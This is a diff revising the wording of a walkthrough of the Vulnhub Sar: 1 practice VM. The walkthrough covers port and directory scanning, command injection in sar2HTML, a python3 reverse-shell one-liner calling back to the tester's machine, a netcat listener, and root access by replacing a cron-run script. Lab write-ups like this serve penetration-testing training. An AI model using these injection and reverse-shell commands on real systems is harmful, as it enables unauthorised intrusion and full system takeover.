@@ -5,11 +5,11 @@
 
 Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.  It is a Linux box and released on Feb 15, 2020.
 
-Download : [Sar: 1](https://www.vulnhub.com/entry/sar-1,425/)  
+Download : [Vulnhub - Sar: 1](https://www.vulnhub.com/entry/sar-1,425/)  
 Format   : VirtualBox (OVA)  
 DHCP     : Enabled  
 
-Since the ```netdiscover``` not working properly at my Kali 2020.1, I use ```nmap``` instead to get the IP address of the Sar:1 box which is on ```10.0.2.18```.  My Kali box is on ```10.0.2.24```.
+Since the ```netdiscover``` is not working properly at my Kali 2020.1, I use ```nmap``` instead to get the IP address of the Sar:1 box which is on ```10.0.2.18```.  My Kali box is on ```10.0.2.24```.
 
 ```bash
 samiux@kali:~$ nmap 10.0.2.0/24
@@ -57,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
 ```
 
-The scan reports only port 80 is opened.  Thus, ```gobuster``` is used for the directories of the box.
+The scan shows that port 80 is opened only.  Thus, ```gobuster``` is used for scanning the directories of the box.
 
 ```bash
 samiux@kali:~$ gobuster dir -u http://10.0.2.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -84,17 +84,17 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Open the ```Firefox``` to browse on the ```10.0.2.18```.  Then browse ```robots.txt``` also.
+Opens the ```Firefox``` to browse on the ```10.0.2.18```.  Then browses ```robots.txt``` also.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-001.png)  
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-002.png)  
 
-The ```robots.txt``` shows ```sar2HTML```.  Browse to it and it shows sar2html application.
+The ```robots.txt``` shows ```sar2HTML```.  Browses to it and it shows ```sar2html``` application.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-003.png)  
 
-Conduct a ```searchsploit``` on Kali box.
+Conducts a ```searchsploit``` on Kali box.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-004.png)  
 
@@ -116,15 +116,15 @@ the command you entered. After command injection press "select # host" then your
 output will appear bottom side of the scroll screen.
 ```
 
-Click on ```NEW``` on the left hand side and it shows the url is ```http://10.0.2.18/sar2HTML/index.php?plot=NEW```.
+Clicks on ```NEW``` on the left hand side and it shows the url is ```http://10.0.2.18/sar2HTML/index.php?plot=NEW```.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-005.png)  
 
-Test it with ```;id``` and found it can execute command ```id```.
+Tests it with ```;id``` and it can execute command ```id```.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-006.png)  
 
-After several tries and errors, it is confirmed that ```python3``` and ```bash``` are installed on the box.
+After several tries and errors, it is confirmed that ```python3``` and ```bash``` are installed on the box.  I try to use bash as reverse shell but failed.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-007.png)  
 
@@ -136,7 +136,7 @@ Places the following python3 command on the url.
 ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.24",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-And run the listener at another terminal.
+And runs the listener at another terminal on Kali.
 
 ```bash
 nc -lvp 4444
@@ -144,29 +144,29 @@ nc -lvp 4444
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-008.png)  
 
-I found out that ```finally.sh``` and ```write.sh``` at ```/var/www/html``` of the box.
+I find out that ```finally.sh``` and ```write.sh``` are at ```/var/www/html``` of the box.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-009.png)  
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-010.png)  
 
-After a search on ```/home/love/Desktop```, I found the ```user.txt``` key.
+After a search on ```/home/love/Desktop```, I find the ```user.txt``` key.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-011.png)  
 
 ## **Reverse shell and root.txt**
 
-Back to the ```finally.sh``` and ```write.sh```.  After a search, I found ```/etc/crontab``` which runs ```finally.sh``` on every 5 minutes.  However, I cannot see ```gateway``` at ```/tmp``` after 5 minutes.
+Back to the ```finally.sh``` and ```write.sh```.  After a search, I find ```/etc/crontab``` which runs ```finally.sh``` on every 5 minutes.  However, I cannot see the file namely ```gateway``` at ```/tmp``` after 5 minutes or so.
 
-After thinking of a while, I decided to replace the ```write.sh``` with my own ```write.sh```.  I prepared the ```write.sh``` at ```/var/www/html``` of my Kali box and then starts the Apache2.
+After thinking for a while, I make up my mind to replace the ```write.sh``` with my own ```write.sh```.  I prepare the ```write.sh``` at ```/var/www/html``` of my Kali box and then starts the Apache2 web server.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-012.png)  
 
-Download my own copy of ```write.sh``` to the box and makes it executable.  Prepare another listener at port 7777 on Kali.
+Download my own copy of ```write.sh``` to the box and makes it executable.  Prepares another listener at port 7777 on Kali.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-013.png)  
 
-After 5 minutes or so, I got the reverse shell and the ```root.txt``` is found on ```/root```.
+After 5 minutes or so, I get the reverse shell and the ```root.txt``` is on ```/root```.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-014.png)  
 
